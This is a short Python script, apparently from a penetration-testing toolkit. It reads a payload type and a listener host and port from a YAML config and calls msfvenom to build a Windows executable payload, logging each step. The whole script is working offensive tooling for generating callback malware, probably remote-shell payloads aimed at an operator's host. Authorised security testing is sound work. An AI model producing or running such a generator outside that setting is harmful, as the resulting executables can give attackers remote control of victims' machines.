import subprocess
import json
import logging
import os
import yaml

# Load configuration
with open("config.yaml", "r") as file:
    config = yaml.safe_load(file)

payload_type = config["payload"]["type"]
lhost = config["payload"]["lhost"]
lport = config["payload"]["lport"]

# Configure logging
logging.basicConfig(filename="logs/vapt.log", level=logging.INFO, format="%(asctime)s - %(message)s")

def generate_payload():
    """Generates a payload using MSFvenom"""
    try:
        logging.info(f"Generating payload: {payload_type} for {lhost}:{lport}")
        payload_file = f"payloads/{payload_type.replace('/', '_')}.exe"
        os.makedirs("payloads", exist_ok=True)

        command = [
            "msfvenom", "-p", payload_type, f"LHOST={lhost}", f"LPORT={lport}", "-f", "exe", "-o", payload_file
        ]
        subprocess.run(command, check=True)

        logging.info(f"Payload saved: {payload_file}")
        return payload_file
    except Exception as e:
        logging.error(f"Error generating payload: {str(e)}")
        return None
